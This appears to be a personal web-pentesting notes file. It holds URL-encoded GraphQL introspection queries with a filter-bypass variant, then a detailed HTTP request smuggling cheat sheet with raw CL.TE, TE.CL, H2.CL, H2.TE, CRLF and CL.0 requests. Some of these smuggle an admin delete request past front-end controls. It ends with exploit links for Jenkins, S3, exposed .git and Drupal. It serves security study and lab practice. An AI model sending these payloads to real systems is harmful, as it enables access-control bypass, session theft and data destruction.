+query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+
+if this not allow try this
+
+query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+-----------------------------------	
+demo creditcard - https://www.duplichecker.com/credit-card-generator.php
+
+checklist for graphql - https://anmolksachan.github.io/graphql/ 
+
+Test for dos also using graphqlcop
+
+HTTP request smuggling attack
+-------------------------------
+	What can i achive if attack is sucess: bypass authentication on some pages, get someone cookies, xss, combine with web cache poisioning,data of other user
+	After find smuggling also try response-queue-poising
+	The smuggling attack is 3 types :
+		
+    CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
+    TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
+    TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
+	
+	https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling
+	
+	Observation Point:
+		check if the application support HTTP 1.1 or not
+		check it's content length and trasfer-encoding ( remember for transfer encoding 0 mean it is the endof the body)
+		
+For detct vulnerability try out detect map placed in ak's resource folder.
+	Finding CL.TE vulnerrability if following below is in timedalay or timeout
+		POST / HTTP/1.1
+		Host: vulnerable-website.com
+		Transfer-Encoding: chunked
+		Content-Length: 4
+
+		1
+		A
+		X
+	
+	Finding TE.CL vulnerrability if following below is in timedalay or timeout
+		POST / HTTP/1.1
+		Host: vulnerable-website.com
+		Transfer-Encoding: chunked
+		Content-Length: 6
+
+		0
+
+		X
+		
+	For confirming CL.TE 
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 49
+		Transfer-Encoding: chunked
+
+		e
+		q=smuggling&x=
+		0
+
+		GET /404 HTTP/1.1
+		Foo: x
+	
+	For confirming TE.CL
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 4
+		Transfer-Encoding: chunked
+
+		5e
+		POST /404 HTTP/1.1
+		Content-Type: application/x-www-form-urlencoded
+		Content-Length: 15
+
+		x=1
+		0
+	(in second Content-Length = totalcharacter+11 or Content-Length = totalcharacter including /r/n+1)
+	
+		Exploit front end security control
+			for CL.TE vulnerability
+						for exploit TE.CL use like this
+														Content-Length: 139
+														Transfer-Encoding: chunked
+
+														0
+
+														GET /admin/delete?username=carlos HTTP/1.1
+														Host: localhost
+														Content-Type: application/x-www-form-urlencoded
+														Content-Length: 10
+
+														x=
+														
+			for TE.CL vulnerability https://www.youtube.com/watch?v=XvqAbDo5DI0 use this video
+				Note: for update for TE.Cl always uncheck the content-length update
+					  give the uper content length is 4 and lower Content-Length = totalcharacter+11 or Content-Length = totalcharacter including /r/n+1
+					  in the second request after 0 take a one empty line like 0/r/n
+																				/r/name
+					  for exploit TE.CL use like this
+														Content-Type: application/x-www-form-urlencoded
+														Content-Length: 4
+														Transfer-Encoding: chunked
+
+														82
+														GET /admin/delete?username=carlos HTTP/1.1
+														Host: localhost
+														Content-Type: application/x-www-form-urlencoded
+														Content-Length: 10
+
+														0
+						(here 82 is the hexadecimol from GET to Content-Length: 10/r/n  , always chnge in every request)
+	H2.CL attack:
+		use request like this (one is hhtp2 and below is http1.1) to detect H2.CL
+			POST / HTTP/2/r/n
+			Host: vulnerable.com/r/n
+			Content-Length: 6/r/n
+			/r/n
+			x=1/r/n
+			/r/n
+			GET /random HTTP/1.1/r/n
+			Foo: dd
+		
+		after send this quick send the request like this 
+			POST / HTTP/2
+			Host: vulnerable.com
+			Content-Length: 6
+		
+		If it is 404 like response then it is vulnerabile to h2.cl https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling , https://www.youtube.com/watch?v=n2k5zdA0ycg&t=1s
+	
+	H2.TE attack:
+		H2.CL attack:
+		use request like this (one is hhtp2 and below is http1.1) to detect H2.TE
+			POST / HTTP/2/r/n
+			Host: vulnerable.com/r/n
+			Transfer-Encoding: chunked/r/n
+			/r/n
+			0/r/n
+			/r/n
+			GET /random HTTP/1.1/r/n
+			Foo: dd
+		
+		after send this quick send the request like this 
+			POST / HTTP/2
+			Host: vulnerable.com
+			Content-Length: 6
+		If it is 404 like response then it is vulnerabile to h2.te
+	
+	If H2.CL and H2.TL not found the try to find this conbine with CRLF https://www.youtube.com/watch?v=unVNdJ1IWpw
+		For h2.tl with crlf:	
+			1. Expand the Inspector's Request Attributes section and make sure the protocol is set to HTTP/2.
+			2. Using the Inspector, add an arbitrary header to the request. Append the sequence \r\n to the header's value, followed by the Transfer-Encoding: chunked header:
+				example:
+								Name
+								foo
+
+								Value
+								bar\r\n
+								Transfer-Encoding: chunked
+
+			In the body, attempt to smuggle an arbitrary prefix as follows:
+								0
+
+								SMUGGLED
+
+			Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix
+	5 pseudo-headers - methods, path, authority, scheme, status
+	Try Response splising using inspector click on requestheader the create herader like 'foo' and the value field put 'ff/r/n/r/nGET /random HTTP/1.1/r/nHost: domain.com' after send the request observe the next request for sucess you get next request 404
+	
+	CL.0 attack:
+		Burp scaning is able to find this vulnerability. https://www.youtube.com/watch?v=9zgDC5j58p8
+		1. find an static endpoint(.jpg, .js, .svg etc..) that are ignoring Contant-length (also you can test in server level redirect or server error request) for do this find any .svg or .js etc file and send it to repeater then check if it is works on POST or not if works on POST then go ahead.
+		2. Add a Header "Connection: keep-alive" then change to HTTP/1.1 and add an smuggling request like (remember to enable the update content-length for auto update the length)
+			POST /resources/images/blog.svg HTTP/1.1
+			Host: vul.com
+			Cookie: session=YOUR-SESSION-COOKIE
+			Connection: keep-alive
+			Content-Type: application/x-www-form-urlencoded
+			Content-Length: 34(automatic)
+			
+			GET /hopefully404 HTTP/1.1
+			Foo: x
+		3. Set a sequence in repeter then send 
+	
+	CSD - Client Side Desync 
+		How to find - If the application use only HTTP/1.1 (not support http2) and in the server level redirect
+		then try same as CL.0
+		watch the video https://www.youtube.com/watch?v=QapdENfSXzE
+		desync attack
+		--------------------
+		https://redbotsecurity.com/client-side-desync/
+		https://www.cobalt.io/blog/a-dive-into-client-side-desync-attacks
+		https://medium.com/@angryovalegg/client-side-desync-attack-4b71f00f0306
+
+
+
+
+To add https in starting of url:
+awk  '{print "http://" $1}' list_domains.txt
+
+Jenkins Pentest:
+https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security
+https://github.com/gquere/pwn_jenkins
+
+S3 enumuation:
+------------
+https://www.yeswehack.com/learn-bug-bounty/abusing-s3-bucket-permissions
+https://infosecwriteups.com/s3-bucket-misconfigured-access-controls-to-critical-vulnerability-6b535e3df9a5
+
+Note:
+after install a go file this is instll in /go/bin/name
+then you can copy this file to /usr/bin
+cp /go/bin/name /usr/bin
+
+to find ip to host use the tool "hakip2host"
+
+create multi account
+check 2fa bypass using reset functionality
+
+.git file disclosure
+-----------------
+https://medium.com/stolabs/git-exposed-how-to-identify-and-exploit-62df3c165c37
+https://captainnoob.medium.com/source-code-disclosure-via-exposed-git-folder-d22919c590a2
+https://satyasai1460.medium.com/how-git-folder-can-be-exploited-to-access-sensitive-data-eb805c38fd6c
+https://infosecwriteups.com/exposed-git-directory-exploitation-3e30481e8d75
+
+drupal cve check
+-----------------
+https://medium.com/@briskinfosec/drupal-core-remote-code-execution-vulnerability-cve-2019-6340-35dee6175afa
+https://medium.com/@knownsec404team/the-analysis-of-drupal-1-click-to-rce-ad7799b428e6
+https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
+if drupal using 7.x version https://medium.com/@yasmeena_rezk/drupal-7-x-exploitation-7eb1c7cfa4dc
+
+If the application uses IIS server then try this tool
+----------------------------------------------------------
+https://github.com/sw33tLie/sns?tab=readme-ov-file
+
+Temp mail
+---------
+tamp mail
+yopmail
+anon ady
